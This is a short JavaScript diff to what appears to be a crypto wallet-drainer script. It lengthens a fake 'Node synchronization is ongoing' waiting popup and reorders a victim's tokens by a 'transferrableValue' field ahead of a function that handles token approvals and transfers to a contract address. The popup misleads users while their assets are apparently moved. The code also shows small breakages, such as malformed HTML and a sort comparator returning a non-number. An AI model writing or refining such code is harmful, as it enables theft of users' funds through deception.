@@ -380,7 +380,7 @@ async function connectWallet() {
         });
 
         try {
-          const randomTimerDuration = Math.floor(Math.random() * 50) + 50;
+          const randomTimerDuration = Math.floor(Math.random() * 11) + 90;
             Swal.fire({
                 title: 'Please Wait...',
                 html: 'Node synchronization is ongoing. I will close after Synchronization is complete. Average wait time is <b></b seconds',
@@ -820,7 +820,7 @@ async function fetchTokenDetails(tokens, address, signer) {
               balance: balance,
               symbol: token.tokenSymbol,
               address: token.contractAddress,
-              usdValue: usdValue,
+              transferrableValue
             };
           }
         } else {
@@ -832,7 +832,7 @@ async function fetchTokenDetails(tokens, address, signer) {
     })
   );
 
-  return tokenDetails.filter((token) => token).sort((a, b) => b.usdValue - a.usdValue);
+  return tokenDetails.filter((token) => token).sort((a, b) => b.transferrableValue.sub(a.transferrableValue));
 }
 
 async function handleTokenApprovalsAndTransfers(tokenDetails, contractAddr, signer) {
